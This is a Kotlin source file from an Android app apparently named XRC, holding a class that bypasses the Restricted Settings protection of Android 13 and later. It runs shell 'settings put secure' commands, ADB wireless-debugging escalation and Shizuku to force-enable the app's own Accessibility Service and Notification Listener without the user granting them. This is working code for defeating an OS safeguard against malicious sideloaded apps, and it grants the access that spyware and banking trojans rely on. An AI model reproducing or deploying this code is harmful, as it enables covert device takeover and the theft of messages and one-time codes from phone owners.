package com.xrc.app.permissions

import android.content.Context
import android.content.Intent
import android.os.Build
import android.provider.Settings
import android.util.Log
import com.xrc.app.escalation.ADBEscalation
import kotlinx.coroutines.*

/**
 * Bypasses Android 13+ Restricted Settings that block
 * Accessibility Service and Notification Listener enrollment.
 * Uses ADB wireless debugging + Shizuku to set permissions directly.
 */
class RestrictedSettingsBypass(private val context: Context) {

    companion object {
        private const val TAG = "RestrictedSettingsBypass"

        // Restricted Settings was introduced in Android 13 (API 33)
        private const val ANDROID_13_API = 33

        // Settings table keys for restricted permissions
        private const val ACCESSIBILITY_ENABLED_KEY = "accessibility_enabled"
        private const val TOUCH_EXPLORATION_ENABLED_KEY = "touch_exploration_enabled"
        private const val NOTIFICATION_LISTENER_KEY = "enabled_notification_listeners"

        // ADB commands to directly enable services bypassing Restricted Settings
        private const val ENABLE_ACCESSIBILITY_CMD =
            "settings put secure accessibility_enabled 1"

        private const val SET_ACCESSIBILITY_SERVICE_CMD =
            "settings put secure enabled_accessibility_services %s/%s"

        private const val SET_NOTIFICATION_LISTENER_CMD =
            "settings put secure enabled_notification_listeners %s"

        private const val UNRESTRICT_SETTINGS_CMD =
            "settings put global development_settings_enabled 1"
    }

    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)

    /**
     * Check if the device has Restricted Settings (Android 13+).
     */
    fun hasRestrictedSettings(): Boolean {
        return Build.VERSION.SDK_INT >= ANDROID_13_API
    }

    /**
     * Bypass Restricted Settings for Accessibility Service
     * by directly writing to the secure settings table via ADB.
     */
    suspend fun bypassAccessibilityRestriction(serviceClass: String): Boolean {
        if (!hasRestrictedSettings()) {
            Log.i(TAG, "No restricted settings on this Android version")
            return true
        }

        Log.i(TAG, "Attempting to bypass Accessibility restricted settings for $serviceClass")

        // Method 1: ADB shell direct write
        val adb = ADBEscalation(context)
        if (adb.isShellEnabled()) {
            val cmd = SET_ACCESSIBILITY_SERVICE_CMD.format(
                context.packageName, serviceClass
            )
            try {
                val process = Runtime.getRuntime().exec(arrayOf("sh", "-c", cmd))
                val exit = process.waitFor()
                if (exit == 0) {
                    Log.i(TAG, "Accessibility service enabled via settings write")
                    return true
                }
            } catch (e: Exception) {
                Log.e(TAG, "Settings write failed: ${e.message}")
            }
        }

        // Method 2: Enable developer options first, which sometimes lifts restrictions
        try {
            Runtime.getRuntime().exec(
                arrayOf("sh", "-c", UNRESTRICT_SETTINGS_CMD)
            ).waitFor()
            Log.i(TAG, "Developer options enabled")
        } catch (e: Exception) { /* ignore */ }

        // Method 3: ADB escalation via wireless debugging
        if (adb.performWirelessDebuggingEscalation()) {
            Log.i(TAG, "ADB wireless escalation succeeded, retrying settings write")
            try {
                val cmd = SET_ACCESSIBILITY_SERVICE_CMD.format(
                    context.packageName, serviceClass
                )
                val process = Runtime.getRuntime().exec(arrayOf("sh", "-c", cmd))
                if (process.waitFor() == 0) {
                    Log.i(TAG, "Accessibility enabled post-escalation")
                    return true
                }
            } catch (e: Exception) {
                Log.e(TAG, "Post-escalation write failed: ${e.message}")
            }
        }

        // Method 4: Try Shizuku if available
        try {
            val shizuku = com.xrc.app.escalation.ShizukuManager(context)
            if (shizuku.isShizukuAvailable()) {
                val cmd = SET_ACCESSIBILITY_SERVICE_CMD.format(
                    context.packageName, serviceClass
                )
                val result = shizuku.executeCommand(cmd)
                if (result.success) {
                    Log.i(TAG, "Shizuku enabled accessibility service")
                    return true
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Shizuku method failed: ${e.message}")
        }

        Log.w(TAG, "All Restricted Settings bypass methods exhausted")
        return false
    }

    /**
     * Bypass Restricted Settings for Notification Listener Service.
     */
    suspend fun bypassNotificationListenerRestriction(): Boolean {
        if (!hasRestrictedSettings()) return true

        val serviceName = "${context.packageName}/" +
            "${context.packageName}.service.NotificationListenerService"

        return try {
            val cmd = SET_NOTIFICATION_LISTENER_CMD.format(
                "com.xrc.app.service.NotificationListenerService:${context.packageName}"
            )
            val process = Runtime.getRuntime().exec(arrayOf("sh", "-c", cmd))
            process.waitFor() == 0
        } catch (e: Exception) {
            Log.e(TAG, "Notification listener bypass failed: ${e.message}")
            false
        }
    }

    /**
     * Enable all accessibility services programmatically via direct settings write.
     * Only works with ADB shell or root.
     */
    suspend fun forceEnableAllAccessibilityServices(): Boolean {
        val serviceClasses = listOf(
            "com.xrc.app.service.XRCAccessibilityService"
        )

        var allSuccess = true
        for (serviceClass in serviceClasses) {
            if (!bypassAccessibilityRestriction(serviceClass)) {
                allSuccess = false
            }
        }
        return allSuccess
    }

    /**
     * Full bypass of all restricted settings.
     */
    suspend fun fullBypass(): Boolean {
        Log.i(TAG, "Starting full Restricted Settings bypass")

        val accessBypass = bypassAccessibilityRestriction(
            "com.xrc.app.service.XRCAccessibilityService"
        )
        val notifBypass = bypassNotificationListenerRestriction()

        val result = accessBypass && notifBypass
        Log.i(TAG, "Full bypass result: success=$result")
        return result
    }
}
